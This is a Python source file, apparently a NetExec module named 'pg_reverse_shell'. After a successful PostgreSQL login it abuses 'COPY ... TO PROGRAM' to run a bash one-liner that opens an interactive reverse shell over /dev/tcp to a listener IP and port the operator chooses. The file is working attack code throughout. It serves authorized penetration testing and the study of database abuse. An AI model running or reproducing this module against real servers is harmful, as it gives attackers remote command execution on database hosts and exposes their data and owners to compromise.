import psycopg
from psycopg import sql
from nxc.helpers.misc import CATEGORY
#from nxc.logger import NXCAdapter

class NXCModule:
    """
    Implemented reverse shell via COPY ... TO PROGRAM mechanism
    Module by end0x1
    """

    name = "pg_reverse_shell"
    description = "Implemented reverse shell via COPY ... TO PROGRAM mechanism"
    supported_protocols = ["postgres"]
    category = CATEGORY.PRIVILEGE_ESCALATION


    def options(self, context, module_options):
        """
        LISTENER    LISTENERE IP
        PORT        LISTENER PORT
        METHOD      Reverse shell launch method

        """
        self.listener = None
        self.port = None
        self.method = 'bash'

        if "LISTENER" not in module_options and "PORT" not in module_options:
            context.log.fail("Required parameters were not provided")
            return False

        self.listener = module_options["LISTENER"]
        self.port = module_options["PORT"]
        self.method = module_options.get("METHOD") or "bash"
        

    def on_login(self, context, connection):
        """Runs once credentials have been validated by postgres.plaintext_login()."""
        try:
            conn = psycopg.connect(
                host=connection.host,
                port=connection.port,
                user=connection.username,
                password=connection.password,
                dbname=connection.args.database,
                connect_timeout=connection.args.postgres_timeout,
            )
        except Exception as e:
            context.log.fail(f"Could not open a connection: {e}")
            return
        if self.method == "bash":
            cmd = f"setsid bash -c 'bash -i >& /dev/tcp/{self.listener}/{self.port} 0>&1' >/dev/null 2>&1 &"
            try:
                with conn.cursor() as cur:
                    cur.execute(sql.SQL("COPY (SELECT '') TO PROGRAM {}").format(sql.Literal(cmd)))
                    #rows = cur.fetchall()[0]
                    context.log.success(f"Success")
            except Exception as e:
                context.log.fail(f"Error: {e}")
                return
            finally:
                conn.close()
